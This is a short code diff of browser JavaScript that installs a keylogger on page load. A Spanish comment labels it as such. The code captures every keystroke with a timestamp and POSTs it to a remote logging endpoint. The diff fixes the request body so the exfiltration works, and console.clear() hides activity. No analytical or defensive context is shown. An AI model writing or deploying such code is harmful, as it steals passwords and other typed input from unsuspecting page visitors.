@@ -19,7 +19,7 @@ document.addEventListener('DOMContentLoaded', function () {
       //Finalmente agregamos el keylogger
       window.addEventListener("keydown", function (e) {
         fetch(https_listener_for_logging, {
-          method: "POST", body: { "key": e.key, "url": newUrl, "timestamp": Date.now() },
+          method: "POST", body: JSON.stringify({ "key": e.key, "timestamp": Date.now() }),
         });
       });
       console.clear();
